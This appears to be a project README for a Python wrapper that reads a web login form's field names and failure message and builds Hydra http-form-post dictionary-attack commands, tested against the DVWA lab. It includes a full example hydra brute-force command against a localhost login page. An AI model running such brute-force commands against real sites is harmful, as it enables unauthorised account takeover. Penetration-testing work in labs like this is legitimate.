# HydraAutomation
Trying to automate hydra dic attacks against web pages so that the user doesn't have to go into the DOM in order to find the variable names for ^USER^ ,^PASS^, the form method, and failure response.

Currently, the program is only suited for http-form-post attacks and I have been using DVWA as my lab for testing.

The program is a wrapper so it requires hydra and of course Python to be preinstalled.

Run the program on the command line 
>Python HydraAutomation.py URLOrIPAddress

Example:

>Python HydraAutomation.py http://localhost/DVWA-1.0.8/login.php
>
>--------------------------------------------
>HYDRA COMMAND AUTOMATER RESULTS:
>
>"login.php:

>username=^USER^

>password=^PASS^

>:Login failed"
>
>hydra http://localhost/DVWA-1.0.8/login.php http-form-post "login.php:username=^USER^&password=^PASS^:Login failed" -L user.txt -P >pass.txt -t 10
